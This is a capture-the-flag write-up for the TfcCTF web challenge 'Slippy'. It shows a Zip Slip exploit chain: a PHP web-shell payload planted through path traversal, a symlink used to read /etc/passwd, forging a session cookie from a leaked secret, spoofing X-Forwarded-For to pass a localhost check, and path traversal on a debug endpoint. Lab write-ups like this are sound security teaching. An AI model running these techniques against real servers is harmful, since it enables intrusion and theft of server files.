---
title: Slippy
summary: Slipping Jimmy keeps playing with Finger.
tags: [TfcCTF, Web, Zip Slip]
date: 2025-08-31
showtoc: true
---

# Slippy

## Description

Slipping Jimmy keeps playing with Finger.

Difficulty: Baby  
Author: Sagi

[Given files](/litctf/group-chat/main.py)

## Solution

The application allows us to upload a zip file.

![index](/tfcctf/slippy/index.png)

Let's start by trying a simple zip file.

```sh
$ echo foo > foo.txt; zip foo.zip foo.txt
```

After uploading it, the web application unzips the file and allows us to download the unzipped files.

![files](/tfcctf/slippy/files.png)

By examining vulnerabilities around unzipping files, I discovered the Zip Slip vulnerability. This vulnerability can allow us to do two things:

- Overwrite arbitrary files: We can create a zip file containing files that use path traversal (e.g., a file named `../index.php`). When unzipped, these files will be written outside the current directory.

```sh
$ echo '<?php echo system("id");?>' > '../index.php'
$ zip payload.zip '../index.php'
```

- Read arbitrary files: If we zip a symlink, and the web application unzips and displays its content, we can read any file on the server.

```sh
$ ln -s /etc/passwd link
$ zip --symlink payload.zip link
```

So I tried uploading a zip file containing a symlink to `/etc/passwd`, and after downloading the unzipped files, I was able to retrieve the `/etc/passwd` file from the server.

After identifying this vulnerability, I looked for the flag in the source code to see if retrieving it would be sufficient to solve the challenge.

However, it wasn't that simple. The flag is stored in a directory with a random name.

```dockerfile
RUN rand_dir="/$(head /dev/urandom | tr -dc a-z0-9 | head -c 8)"; mkdir "$rand_dir" && echo "TFCCTF{Fake_fLag}" > "$rand_dir/flag.txt" && chmod -R +r "$rand_dir"
```

Even though the flag was not directly accessible, I was able to retrieve two other secrets using the Zip Slip vulnerability:

* The secret for generating session cookies:

```sh
SESSION_SECRET=3df35e5dd772dd98a6feb5475d0459f8e18e08a46f48ec68234173663fca377b
```

```js
app.use(session({
  secret: process.env.SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  store: store
}));
```

* The session ID for `develop`:

```js
const sessionData = {
    cookie: {
      path: '/',
      httpOnly: true,
      maxAge: 1000 * 60 * 60 * 48 // 1 hour
    },
    userId: 'develop'
};
store.set('amwvsLiDgNHm2XXfoynBUNRA2iWoEH5E', sessionData, err => {
    if (err) console.error('Failed to create develop session:', err);
    else console.log('Development session created!');
});
```

With these secrets, the next step was to find a way to leak the directory name containing the flag.

While reviewing the source code, I found a debug endpoint.

```js
router.get('/debug/files', developmentOnly, (req, res) => {
    const userDir = path.join(__dirname, '../uploads', req.query.session_id);
    fs.readdir(userDir, (err, files) => {
    if (err) return res.status(500).send('Error reading files');
    res.render('files', { files });
  });
});
```

However, when I tried to access it, I received the following message:

```
Forbidden: Development access only
```

This is due to the `developmentOnly` middleware, which restricts access to this endpoint.

```js
module.exports = function (req, res, next) {
    if (req.session.userId === 'develop' && req.ip == '127.0.0.1') {
      return next();
    }
    res.status(403).send('Forbidden: Development access only');
};
```

In order to access this endpoint, I needed to be authenticated as the `develop` user and have the IP `127.0.0.1`.

I already had the `develop` user ID from earlier, so the next step was to forge a session cookie.

```js
const cookieSignature = require("cookie-signature");
const secret =
  "3df35e5dd772dd98a6feb5475d0459f8e18e08a46f48ec68234173663fca377b";
const sessionId = "amwvsLiDgNHm2XXfoynBUNRA2iWoEH5E";

const signedSessionId = "s:" + cookieSignature.sign(sessionId, secret);
console.log(signedSessionId);
```

I tested if the cookie worked by returning to the homepage, where it displayed the current user ID.

![develop](/tfcctf/slippy/develop.png)

Next, I needed to set my IP to `127.0.0.1`. To bypass this check, I used the `X-Forwarded-For` header and configured Burp Suite to automatically insert `X-Forwarded-For: 127.0.0.1` into each request.

I then tried accessing the debug endpoint again at `/debug/files?session_id=`, and it worked!

![debug\_files](/tfcctf/slippy/debug_files.png)

From the code of the endpoint, I realized that it lists all files and directories in the `uploads/PATH` directory, where `PATH` is the `session_id` query parameter.

So, I tried to use path traversal to leak the random directory containing the flag by accessing `/debug/files?session_id=../../`.

![root](/tfcctf/slippy/root.png)

Now that I had access to the server's file structure, I was able to locate the flag in the directory `/2u9wizpw/flag.txt` using the Zip Slip vulnerability from earlier.

```
TFCCTF{3at_sl1P_h4Ck_r3p3at_5af9f1}
```

# References

* Payloads All The Things: [Zip Slip](https://swisskyrepo.github.io/PayloadsAllTheThings/Zip%20Slip/)
